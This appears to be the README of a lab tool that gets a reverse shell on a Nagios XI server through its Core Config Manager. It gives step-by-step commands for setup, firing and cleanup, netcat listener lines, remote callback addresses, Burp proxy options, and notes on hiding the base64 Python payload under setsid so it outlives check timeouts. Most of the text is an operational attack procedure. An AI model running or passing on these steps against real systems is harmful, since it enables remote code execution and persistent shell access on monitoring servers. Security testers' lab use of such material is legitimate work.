# nagios_ccm_rshell.py

Lab tool for the Nagios XI CCM command -> service RCE primitive. It creates a CCM command running a Python reverse shell, attaches it to a service, forces the check so the shell fires, and tears the objects back down. 

Stdlib only no pip installs.

## Listener and callback address

The shell is executed by the Nagios server, which connects back to
`--lhost:--lport`. Set `--lhost` to your listener's address as reachable from
the Nagios server:

- `127.0.0.1` (default) — you're catching on the Nagios host itself.
- `<your-ip>` — you're catching from another machine (use an address the
  Nagios server can route to).

Start the listener before `fire`:  `nc -lvnp 4444`

## Actions

| Action    | Does                                                      |
|-----------|----------------------------------------------------------|
| `setup`   | create the command + service, apply config               |
| `fire`    | force an immediate check (triggers the payload now)       |
| `status`  | show the service state / last check / plugin output       |
| `cleanup` | delete the service + command, apply config                |
| `all`     | `setup`, wait for the core to register it, then `fire`    |

## Commands

```bash
# catch on the host
nc -lvnp 4444

# set up + fire in one go
python3 nagios_ccm_rshell.py all

# or step by step
python3 nagios_ccm_rshell.py setup
python3 nagios_ccm_rshell.py fire
python3 nagios_ccm_rshell.py status

# remove the command and service
python3 nagios_ccm_rshell.py cleanup
```

## Flags

| Flag               | Default                         | Notes                                   |
|--------------------|---------------------------------|-----------------------------------------|
| `--lhost`          | `127.0.0.1`                     | connect back address, reachable from the Nagios server |
| `--lport`          | `4444`                          |                                         |
| `--host`           | `localhost`                     | host object to attach the service to    |
| `--service`        | `Reverse Shell Test`            | service description                      |
| `--command`        | `lab_rshell`                    | CCM command name                        |
| `--url`            | `http://127.0.0.1:8080/nagiosxi`| XI base URL (env `NAGIOSXI_URL`)        |
| `--apikey`         | nagiosadmin key                 | env `NAGIOSXI_APIKEY`                    |
| `--check-interval` | `5`                             | service check interval (minutes)        |
| `-k, --insecure`   | off                             | skip TLS verify (https / Burp CA)       |
| `--proxy`          | env `NAGIOSXI_PROXY`            | route API traffic through a proxy        |
| `--burp`           | off                             | shorthand for `--proxy http://127.0.0.1:8080` |
| `-v, --verbose`    | off                             | print each request                       |

### Examples

```bash
# full run, everything explicit (username/password auth) — start a listener first:
#   nc -lvnp 4444
python3 nagios_ccm_rshell.py all --username nagiosadmin --password '<password>' --host localhost --service "Reverse Shell Test" --command lab_rshell --template generic-service --contact-group xi_roles_1 --lhost 127.0.0.1 --lport 4444

# tear it down afterwards (prompts for the password):
python3 nagios_ccm_rshell.py cleanup --host localhost --service "Reverse Shell Test" --command lab_rshell --username nagiosadmin

# catch from another machine on a custom port
python3 nagios_ccm_rshell.py all --lhost 10.0.0.5 --lport 9001

# attach to a different host/service name
python3 nagios_ccm_rshell.py setup --host localhost --service "Disk Check" --command disk_rshell

# point at another XI instance over https with a self-signed cert
python3 nagios_ccm_rshell.py all --url https://10.0.0.5/nagiosxi -k --apikey <APIKEY> --lhost 10.0.0.1

# clean up a custom-named run
python3 nagios_ccm_rshell.py cleanup --service "Disk Check" --command disk_rshell
```

## Through Burp Suite

```bash
python3 nagios_ccm_rshell.py all --proxy http://127.0.0.1:8081
python3 nagios_ccm_rshell.py fire --burp          # shorthand for 127.0.0.1:8080
python3 nagios_ccm_rshell.py all --url https://... --burp -k   # https target, trust Burp CA
```

Env form:

```bash
export NAGIOSXI_PROXY=http://127.0.0.1:8081
python3 nagios_ccm_rshell.py all
```

## Notes

- Payload is a base64'd Python reverse shell run via `setsid`, so it survives Nagios reaping the check at `service_check_timeout` (60s). It runs as the `nagios` user, cwd `/tmp`.
- `command_line` avoids `;` and `$` (nagios config comment / macro characters).
- After `setup`, `fire` retries while the core finishes reloading.
- API key / credentials: `CREDENTIALS.txt`.
